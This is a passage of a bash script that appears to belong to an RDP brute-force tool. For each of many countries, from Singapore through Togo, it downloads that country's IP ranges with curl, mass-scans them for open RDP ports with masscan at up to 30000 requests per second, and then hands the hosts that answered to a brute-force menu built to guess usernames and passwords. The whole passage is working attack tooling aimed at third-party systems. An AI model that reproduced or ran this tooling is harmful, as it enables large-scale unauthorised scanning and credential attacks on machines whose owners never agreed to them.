echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "166" ]; then
curl http://ipdiapazon.16mb.com/Singapore.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "167" ]; then
curl http://ipdiapazon.16mb.com/Slovakia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "168" ]; then
curl http://ipdiapazon.16mb.com/Slovenia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "169" ]; then
curl http://ipdiapazon.16mb.com/Solomon_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "170" ]; then
curl http://ipdiapazon.16mb.com/South_africa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "171" ]; then
curl http://ipdiapazon.16mb.com/Spain.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "172" ]; then
curl http://ipdiapazon.16mb.com/Sri_lanka.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "173" ]; then
curl http://ipdiapazon.16mb.com/Sudan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "174" ]; then
curl http://ipdiapazon.16mb.com/Suriname.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "175" ]; then
curl http://ipdiapazon.16mb.com/Swaziland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "176" ]; then
curl http://ipdiapazon.16mb.com/Sweden.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "177" ]; then
curl http://ipdiapazon.16mb.com/Switzerland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "178" ]; then
curl http://ipdiapazon.16mb.com/Syrian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "179" ]; then
curl http://ipdiapazon.16mb.com/Taiwan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "180" ]; then
curl http://ipdiapazon.16mb.com/Tajikistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "181" ]; then
curl http://ipdiapazon.16mb.com/Tanzania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "182" ]; then
curl http://ipdiapazon.16mb.com/Thailand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "183" ]; then
curl http://ipdiapazon.16mb.com/Togo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
